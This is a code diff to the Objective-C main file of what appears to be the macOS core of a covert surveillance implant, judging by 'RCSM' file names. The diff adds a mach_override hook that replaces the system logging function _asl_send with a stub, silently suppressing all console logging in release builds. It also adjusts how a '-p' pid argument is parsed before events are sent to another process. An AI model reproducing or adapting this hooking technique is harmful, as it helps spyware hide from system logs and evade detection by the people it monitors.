@@ -13,11 +13,18 @@
 #import "RCSMCommon.h"
 
 #import "RCSMDesktopImage.h"
+#import "mach_override.h"
 
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
 extern void lionSendEventToPid(pid_t pid);
+
+// Do not log anything in the console
+int _hook_asl_send(int client, int msg)
+{
+  return 1;
+}
 
 int main (int argc, const char *argv[])
 {
@@ -26,20 +33,18 @@ int main (int argc, const char *argv[])
 #ifdef ENABLE_LOGGING
   [RCSMLogger setComponent: @"core"];
   infoLog(@"STARTING");
+#else
+  // suppress every logging in console
+  mach_override("_asl_send", "libsystem_c",(void *)&_hook_asl_send, (void **)NULL);
 #endif
-  
+
   // Fix for lion: AppleEvents only from unhidden proc
   if (argc > 1) 
     {
-      if (argv[2] &&
-          (strncmp(argv[2], "-p", strlen("-p")) == 0)) 
+      if (argv[1] &&
+          (strncmp(argv[1], "-p", strlen("-p")) == 0)) 
         {
-          pid_t pid = atoi(argv[3]);
-
-#ifdef DEBUG_CORE
-          for (int i =0; i < argc; i++) 
-            infoLog(@"param[%d]=%s", i, argv[i]);
-#endif
+          pid_t pid = atoi(argv[2]);
 
           lionSendEventToPid(pid);
 
